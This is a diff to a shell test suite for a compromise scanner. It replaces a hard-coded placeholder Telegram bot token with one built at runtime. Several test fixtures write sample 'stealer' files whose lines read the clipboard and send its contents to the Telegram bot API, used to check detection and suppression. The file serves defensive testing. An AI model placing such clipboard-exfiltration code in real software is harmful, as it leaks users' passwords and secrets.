@@ -739,7 +739,8 @@ write_file() {
 # placeholder (`123456789:AAAA…`), not a working credential.
 # -------------------------------------------------------------------------------
 
-FAKE_TELEGRAM_TOKEN='123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+# Built at runtime so no bot-token literal sits in the repo for secret scanners to flag.
+FAKE_TELEGRAM_TOKEN="123456789:$(printf '%035d' 0 | tr 0 A)"
 
 @test "capture + exfil: a clipboard read sent to a Telegram bot is flagged" {
   write_file "stealer.js" \
@@ -831,7 +832,7 @@ FAKE_TELEGRAM_TOKEN='123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
     'echo $! > .monitor.pid'
   write_file "tray_helper.js" \
     'const clipboardy = require("clipboardy")' \
-    'fetch("https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage?text=" + clipboardy.readSync())'
+    "fetch(\"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage?text=\" + clipboardy.readSync())"
   scan
   assert_failure
   assert_output --partial "monitor.sh:4"
@@ -888,7 +889,7 @@ FAKE_TELEGRAM_TOKEN='123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 @test "no false positive: a capture + exfil combo under node_modules is not flagged" {
   write_file "node_modules/evil/clip.js" \
     'const c = require("clipboardy")' \
-    'fetch("https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage")'
+    "fetch(\"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage\")"
   scan
   assert_success
 }
@@ -902,7 +903,7 @@ FAKE_TELEGRAM_TOKEN='123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 @test "suppression: an inline marker clears a capture-and-exfil finding" {
   write_file "reviewed.js" \
     'const clipboardy = require("clipboardy") // am-i-compromised-ignore: reviewed local clipboard helper' \
-    'fetch("https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage")'
+    "fetch(\"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage\")"
   scan
   assert_success
   assert_output --partial "1 finding suppressed by inline comment"
